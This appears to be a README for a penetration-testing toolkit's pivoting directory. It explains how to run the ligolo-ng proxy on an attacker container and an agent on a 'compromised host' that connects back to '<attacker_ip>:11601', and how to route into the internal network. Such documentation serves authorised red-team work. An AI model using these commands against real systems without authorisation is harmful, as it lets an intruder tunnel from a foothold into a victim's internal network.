# linux/pivot

Tunneling and pivoting binaries for Linux footholds and the attacker machine.

## ligolo-ng

Ligolo-ng is a tunneling tool that creates a TUN interface on the proxy side
and uses a reverse connection from the agent.

- `ligolo-ng/` - agent binaries (dropped on the compromised Linux host)
  - `ligolo-ng/arm64/` - ARM64 variant
- `ligolo-ng-proxy/` - proxy binary (runs on the nihil container, attacker side)

### Basic usage

**Proxy side (nihil container):**
```
# Create TUN interface
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (listens for agent connections)
./ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601
```

**Agent side (compromised host):**
```
./ligolo-ng -connect <attacker_ip>:11601 -ignore-cert
```

**Proxy side - activate tunnel:**
```
# In the ligolo-ng proxy shell:
session          # select session
start            # start tunnel
ifconfig         # check routes

# Add route to pivot network
sudo ip route add <pivot_network>/24 dev ligolo
```

Fetch binaries via catalog: `python3 scripts/update.py`
